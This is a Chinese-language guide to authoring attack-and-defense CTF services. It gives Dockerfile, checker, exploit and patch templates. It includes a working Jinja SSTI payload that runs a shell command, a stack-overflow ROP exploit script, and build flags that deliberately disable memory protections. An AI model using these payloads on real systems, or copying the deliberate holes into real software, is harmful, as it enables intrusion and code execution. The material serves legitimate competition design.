# AWDP 题型出题指南

## 题型定义

AWDP（Attack With Defense Plus）：攻防对抗模式。交付的不是单个 Flag 题，而是一套**可持续运行、可攻击、可修补、可检查**的服务。

适用：综合漏洞服务，选手既要攻击别人又要修补自己的服务。

## 平台配置字段

| 字段 | 推荐测试值 | 说明 |
|------|-----------|------|
| 服务名称 | `SSTI Service` | 同一比赛内唯一 |
| 镜像 | 完整 Registry 引用 | 所有目标节点可拉取 |
| 暴露端口 | `80` | 容器内部端口 |
| Checker 入口 | `python3 checker.py` | 30 秒超时 |
| Exp 入口 | `python3 exp.py` | 30 秒超时 |
| 初始分 | `1000` | 服务基础分 |
| 攻击分 | `50` | 每个合法 Flag |
| SLA 分 | `20` | |
| 修补分 | `100` | 修补验证成功 |
| 异常扣分 | `200` | 服务不可用 |
| 每轮最大攻击 | `3` | 每队每服务 |
| 攻击阶段 | `8-10` 分钟 | |
| 修补阶段 | `8-10` 分钟 | |
| 总轮数 | `2`（测试） | |

## 目录结构

```
awdp-category-knowledge-difficulty-v1/
├── README.md
├── statement.md
├── writeup.md
├── flag-policy.md
├── source/
│   ├── app/              # 服务源码
│   └── ...
├── attachments/          # 给选手的附件（如源码包）
│   └── source.zip
├── docker/
│   ├── Dockerfile
│   ├── docker-compose.test.yml
│   └── healthcheck.sh
└── awdp/
    ├── checker.py         # 服务健康检查脚本
    ├── exp.py             # 漏洞利用脚本（验证用）
    └── patch-example/
        └── update.sh      # 选手修补包示例
```

## 服务镜像要求（核心规则）

1. **监听 0.0.0.0:ExposePort**
2. 从 `GZCTF_FLAG` 读取当前轮/队伍 Flag
3. 启动后在合理时间内可用
4. 支持在运行容器中执行 `update.sh` 修补
5. 补丁应用后服务进程能重载或重启
6. 镜像内包含补丁所需的基础命令（`install`, `pkill`, `sed`, `grep` 等）
7. 漏洞必须能被 Exp **稳定复现**
8. Checker 必须验证**核心业务逻辑**，不只检查 TCP 端口

### Docker 构建上下文（极容易出错）

Dockerfile 在 `docker/` 目录下，`docker build -t xxx docker/` 的上下文就是 `docker/`。
**Dockerfile 里的 `COPY` 只能访问 docker/ 目录内的文件！**

创建题目时，必须把源码也放到 docker/ 下：
```bash
# Web 题：源码在 source/，需要拷到 docker/
cp source/app.py docker/
cp source/requirements.txt docker/

# PWN 题：源码在 source/app/，需要拷到 docker/
cp -r source/app/ docker/app/
```

**写完 Dockerfile 后必须验证所有 COPY 路径在 docker/ 下都存在！**

### Web 服务 Dockerfile 模板

```dockerfile
FROM python:3.12-slim
RUN sed -i 's|http://deb.debian.org|http://mirrors.tuna.tsinghua.edu.cn|g' /etc/apt/sources.list.d/debian.sources
RUN apt-get update && apt-get install -y --no-install-recommends curl && rm -rf /var/lib/apt/lists/*
RUN useradd -r -u 10001 ctf
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
RUN chown -R ctf:ctf /app
COPY start.sh /start.sh
RUN chmod +x /start.sh
HEALTHCHECK --interval=30s --timeout=5s --retries=3 CMD curl -f http://localhost:80/ || exit 1
EXPOSE 80
USER ctf
CMD ["/start.sh"]
```

### PWN 服务 Dockerfile 模板（xinetd + 源码编译）

```dockerfile
FROM ubuntu:22.04
RUN sed -i 's|http://archive.ubuntu.com|http://mirrors.tuna.tsinghua.edu.cn|g' /etc/apt/sources.list
# 注意：PWN 题需要 build-essential（包含 gcc + make + libc6-dev）
RUN apt-get update && apt-get install -y --no-install-recommends \
    xinetd build-essential netcat-openbsd curl && rm -rf /var/lib/apt/lists/*
RUN groupadd -r ctf && useradd -r -g ctf -u 10001 -m -d /home/ctf ctf
# 从 docker/app/ 编译（app/ 已提前从 source/app/ 复制过来）
COPY app/ /home/ctf/app/
RUN cd /home/ctf/app && make && cp <binary> /home/ctf/ && chmod 755 /home/ctf/<binary> && rm -rf /home/ctf/app
COPY ctf.xinetd /etc/xinetd.d/ctf
RUN chmod 644 /etc/xinetd.d/ctf
RUN touch /flag && chown ctf:ctf /flag && chmod 644 /flag
RUN apt-get update && apt-get install -y sed grep psmisc && rm -rf /var/lib/apt/lists/*
COPY start.sh /start.sh
RUN chmod +x /start.sh
HEALTHCHECK --interval=30s --timeout=5s --retries=3 CMD nc -z localhost 9999 || exit 1
EXPOSE 9999
USER ctf
CMD ["/start.sh"]
```

## Checker 规范

### 环境变量
```
AWDP_TARGET_HOST   # 目标主机
AWDP_TARGET_PORT   # 目标端口
AWDP_FLAG          # 目标服务的 Flag
AWDP_SERVICE_ID    # 服务 ID
AWDP_SERVICE_NAME  # 服务名
AWDP_TEAM_ID       # 队伍 ID
```

### 输出规范
最后一行的**第一个状态词**必须是以下之一：
- `OK`：服务正常
- `MUMBLE`：服务响应异常（返回了非预期内容）
- `DOWN`：服务不可达（连接超时/拒绝）
- `CORRUPT`：Flag 错误或丢失

### Checker 代码模板

```python
#!/usr/bin/env python3
"""AWDP Checker for SSTI Service"""
import os
import sys
import requests

host = os.environ["AWDP_TARGET_HOST"]
port = int(os.environ["AWDP_TARGET_PORT"])
flag = os.environ["AWDP_FLAG"]

try:
    # 检查核心业务：health 端点
    response = requests.get(f"http://{host}:{port}/health", timeout=5)
    if response.status_code != 200:
        print(f"MUMBLE unexpected status={response.status_code}")
        sys.exit(0)

    # 检查 Flag 完整性：读取内部 flag-check 端点
    flag_response = requests.get(
        f"http://{host}:{port}/internal/flag-check",
        timeout=5
    )
    if flag not in flag_response.text:
        print("CORRUPT flag storage mismatch")
        sys.exit(0)

    print("OK service and flag are healthy")
except requests.RequestException as exc:
    print(f"DOWN {exc}")
```

### PWN Checker 代码模板

PWN 题 Checker 用 `socket` 而非 `requests`，且**必须兼容 Windows**（见下方注意事项）。

```python
#!/usr/bin/env python3
"""AWDP Checker for PWN BOF Service"""
import os
import sys
import socket

host = os.environ["AWDP_TARGET_HOST"]
port = int(os.environ["AWDP_TARGET_PORT"])
flag = os.environ["AWDP_FLAG"]

TIMEOUT = 5

def check_service():
    """Check service is reachable and responds."""
    try:
        sock = socket.create_connection((host, port), timeout=TIMEOUT)
        sock.settimeout(0.5)
        try:
            data = sock.recv(4096)
        except socket.timeout:
            data = b""
        sock.close()
        if len(data) > 0:
            return True, ""
        else:
            return False, "no data received from service"
    except (socket.timeout, ConnectionRefusedError, OSError) as exc:
        return False, str(exc)

def check_flag_integrity():
    """Verify the expected banner/prompt is served correctly."""
    try:
        sock = socket.create_connection((host, port), timeout=TIMEOUT)
        resp = sock.recv(4096)
        sock.close()
        resp_str = resp.decode("latin-1", errors="replace")

        # Check for known banner keywords
        if "expected_keyword" not in resp_str:
            return False, f"unexpected banner: {resp_str[:80]}"

        return True, ""
    except (socket.timeout, ConnectionRefusedError, OSError) as exc:
        return False, str(exc)

if __name__ == "__main__":
    ok, err = check_service()
    if not ok:
        print(f"DOWN service unreachable: {err}")
        sys.exit(0)

    ok, err = check_flag_integrity()
    if not ok:
        print(f"MUMBLE service response mismatch: {err}")
        sys.exit(0)

    print("OK service is healthy and flag is accessible")
```

### Checker 约定
- 单次运行 5-10 秒内完成
- 所有网络请求设置 `timeout`
- **不输出完整 Flag**
- 输出可定位原因，但不泄漏敏感数据
- 成功退出码为 0；异常使用非 0
- **跨平台兼容**：不要用 `socket.MSG_DONTWAIT`（Windows 不支持），改用 `sock.settimeout()` + try/except `socket.timeout`

## Exp 规范

### 退出码约定
- `0`：漏洞利用成功（漏洞仍存在）→ 攻击者得分
- `非0`：漏洞利用失败（已被修补）→ 攻击者不得分

### Exp 代码模板

```python
#!/usr/bin/env python3
"""AWDP Exp for SSTI Service"""
import os
import sys
import requests

host = os.environ["AWDP_TARGET_HOST"]
port = int(os.environ["AWDP_TARGET_PORT"])
expected = os.environ["AWDP_FLAG"]

# SSTI payload
payload = (
    "{{config.__class__.__init__.__globals__"
    "['os'].popen('cat /tmp/flag').read()}}"
)

try:
    response = requests.post(
        f"http://{host}:{port}/render",
        data={"name": payload},
        timeout=5,
    )
except requests.RequestException:
    sys.exit(2)  # 网络错误，非预期

sys.exit(0 if expected in response.text else 1)
```

### PWN Exp 代码模板

PWN 题 Exp 使用 `socket` + `struct` 发送二进制 payload。**关键注意事项**：

1. **x86_64 栈对齐**：`movaps` 指令要求 16 字节对齐。如果 payload 直接跳 `win()` 会崩溃，必须在 ROP 链前插入 `ret` gadget
2. **偏移量**：通过 pwntools `cyclic` 或 GDB 确定缓冲区到返回地址的偏移
3. **地址**：用 `objdump -t binary | grep win` 获取目标函数地址，用 `objdump -d binary | grep ret` 获取 ret gadget

```python
#!/usr/bin/env python3
"""AWDP Exp for PWN BOF Service - exploits stack buffer overflow to read /flag"""
import os
import sys
import socket
import struct

host = os.environ["AWDP_TARGET_HOST"]
port = int(os.environ["AWDP_TARGET_PORT"])
expected = os.environ["AWDP_FLAG"]

TIMEOUT = 5
BUFFER_OFFSET = 72          # 64-byte buffer + 8-byte saved RBP
RET_GADGET = 0x40101a       # ret instruction (fixes 16-byte stack alignment)
WIN_ADDR = 0x4011f6          # win() function that prints /flag

def exploit():
    sock = socket.create_connection((host, port), timeout=TIMEOUT)
    sock.recv(1024)  # Read banner

    # ROP: padding + ret gadget (align stack) + win() address
    payload = (
        b"A" * BUFFER_OFFSET +
        struct.pack("<Q", RET_GADGET) +
        struct.pack("<Q", WIN_ADDR) +
        b"\n"
    )
    sock.send(payload)

    import time
    time.sleep(0.5)
    response = sock.recv(4096)
    sock.close()

    return response.decode("latin-1", errors="replace")

if __name__ == "__main__":
    try:
        resp = exploit()
    except Exception as exc:
        print(f"Exploit error: {exc}", file=sys.stderr)
        sys.exit(1)

    if expected in resp:
        print("Exploit success: flag obtained", file=sys.stderr)
        sys.exit(0)
    else:
        print(f"Exploit failed: flag not found", file=sys.stderr)
        sys.exit(1)
```

### 获取二进制偏移量（出题时）

```bash
# 在编译好的二进制上执行
objdump -t /path/to/binary | grep win        # 找 win() 地址
objdump -d /path/to/binary | grep "ret$"     # 找 ret gadget 地址
```

编译选项必须关闭保护：
```makefile
CFLAGS = -fno-stack-protector -no-pie -z execstack
```

### Exp 要求
- 稳定、可重复
- 不依赖随机竞争或外部公网服务
- 处理网络异常（timeout、连接拒绝 = 对方已下线或修补）
- PWN 题必须通过 `objdump` 确认地址正确，不可用占位符

## 修补包规范

### 格式要求
- 仅接受 `.tar.gz` 或 `.tgz`
- 最大 16 MiB
- 最多 512 个 entry
- 根目录必须包含 `update.sh`

### 禁止项
- 绝对路径
- `..` 路径穿越
- 符号链接和硬链接
- block/character device
- FIFO

### update.sh 模板

```bash
#!/bin/sh
set -eu

install -m 0644 ./files/app.py /app/app.py

if command -v pkill >/dev/null 2>&1; then
    pkill -HUP -f 'python.*app.py' || true
fi

exit 0
```

### PWN update.sh 模板

PWN 题修补包用 `update.sh` 替换编译好的二进制并重启服务进程。

```bash
#!/bin/sh
set -eu

# PWN 题修补：替换编译好的二进制
install -m 0755 ./files/login_service /home/ctf/login_service

# 用 pkill 重启 xinetd 管理的服务进程
if command -v pkill >/dev/null 2>&1; then
    pkill -HUP login_service || true
fi

# 如果 pkill 不够，也可以直接杀掉所有服务进程让 xinetd 重新拉起
# pkill login_service || true

exit 0
```

修补包目录结构：
```
patch/
├── update.sh
└── files/
    └── login_service      # 修补后的二进制
```

打包方式与 Web 题相同：
```bash
cd patch
tar -czf ../bof-fix-v1.tgz update.sh files
tar -tzf ../bof-fix-v1.tgz   # 验证内容
```

### 修补验证流程

出题后必须验证修补闭环：
1. 构建原始镜像 → 启动容器
2. 运行 Checker → 应输出 `OK`
3. 运行 Exp → 应 exit 0（漏洞存在）
4. 应用补丁（上传 tgz 到容器，执行 `tar -xzf patch.tgz && cd patch && sh update.sh`）
5. 再次运行 Checker → 应仍输出 `OK`（服务正常）
6. 再次运行 Exp → 应 exit 非 0（漏洞已修复）

## 服务设计的安全考虑

1. **Flag 读取端点**：`/internal/flag-check` 仅用于 Checker，不要对选手暴露（可通过内网隔离或认证隔离）
2. **Health 端点**：`/health` 公开可用，返回简单 "OK" 即可
3. **Flag 存储**：写入 `/tmp/flag` 或 `/flag`，确保补丁更新后仍正确
4. **补丁友好**：代码结构清晰，选手容易定位和修补漏洞点

## 验收标准（必须逐条通过）

1. A/B 两队实例都能启动
2. Checker 显示 OK
3. A 队能通过漏洞取得 B 队 Flag
4. A 队提交后得分，重复提交不得分
5. 自己队伍 Flag 被平台拒绝（不能提交自己的 Flag 得分）
6. 修补阶段可上传合法补丁
7. 修补后 Checker 通过（服务仍正常）**且** Exp 失败（漏洞已修复）
8. 修补分计入榜单
9. 停止比赛后实例和端口全部清理
10. 确认运行在支持修补的节点（本地容器后端）

## 构建前检查（必做，每次构建前逐条确认）

1. [ ] `docker/` 目录包含了所有 COPY 需要的文件（app.py, requirements.txt, start.sh 等）
2. [ ] **PWN 题**：`source/app/` 已复制到 `docker/app/`，Makefile 和源码都在
3. [ ] **PWN 题**：Dockerfile 装了 `build-essential`（不是只装 gcc）
4. [ ] **Web 题**：`source/app.py`, `source/requirements.txt` 已复制到 `docker/`
5. [ ] Dockerfile 里有 `USER ctf` 和 `HEALTHCHECK`
6. [ ] docker-compose.test.yml 端口映射用 `0.0.0.0:xxxxx:yyyy`
7. [ ] start.sh 有 `set -eu`，用 `exec` 启动主进程
8. [ ] `/flag` 文件 owner 是 ctf（`chown ctf:ctf /flag`），否则 start.sh 写不进去

## 自检步骤

1. `docker build` → 成功
2. `docker compose up -d` → healthy
3. 模拟 Checker: `AWDP_TARGET_HOST=127.0.0.1 AWDP_TARGET_PORT=18080 AWDP_FLAG=flag{test} python3 checker.py` → 应该输出 OK
4. 模拟 Exp: `AWDP_TARGET_HOST=127.0.0.1 AWDP_TARGET_PORT=18080 AWDP_FLAG=flag{test} python3 exp.py` → 应该 exit 0
5. 制作补丁包并测试：打补丁后 Checker 仍 OK，Exp 返回非 0
6. `docker compose down` → 快速退出
7. **导出镜像 tar 包**（上传平台用）：
   ```bash
   docker save <image-name> -o <challenge-name>.tar
   ```
   放在题目根目录下，文件名与题目名一致。

## 平台提交清单（README 必须包含）

出题完成后，README.md 必须包含以下全部信息，提交者可直接复制到平台：

### 1. 平台配置参数表

```markdown
| 配置项 | 值 |
|--------|-----|
| 服务名称 | {题目名} |
| 容器镜像 | {challenge-name}.tar（docker load 导入后推送到 Registry） |
| 暴露端口 | {容器内部端口，如 9999} |
| Checker 入口 | python3 checker.py |
| Exp 入口 | python3 exp.py |
| 攻击分 | 50 |
| SLA 分 | 20 |
| 修补分 | 100 |
| 异常扣分 | 200 |
| 攻击阶段 | 10 分钟 |
| 修补阶段 | 10 分钟 |
| 总轮数 | 20 |
| 每轮最大攻击 | 3 |
```

### 2. Checker 脚本

README 中粘贴完整的 checker.py 内容。**必须匹配服务类型**：
- PWN 题 → `socket` 直连 TCP 端口，检查 banner/关键字
- Web 题 → `requests`/`urllib` HTTP 请求

### 3. Exp 脚本

README 中粘贴完整的 exp.py 内容。PWN 题须注明：
- 偏移量和 ROP 地址来源（`objdump -t/-d`）
- 编译选项（`-fno-stack-protector -no-pie`）

### 4. 常见提交错误（CRITICAL）

| 错误 | 后果 | 正确做法 |
|------|------|----------|
| 暴露端口填 80 或其他错误端口 | Checker 连不上，服务 DOWN | 填容器内部端口（xinetd=9999, Web=80） |
| Checker/Exp 用 Web HTTP 模板贴到 PWN 题 | 全是 DOWN/FAIL | PWN 用 socket，Web 用 HTTP |
| 没导出镜像 tar | 平台无法导入 | `docker save` 导出到题目根目录 |
| README 没有完整的 Checker/Exp 脚本 | 提交者不知道怎么配 | 直接粘贴完整 Python 代码块 |
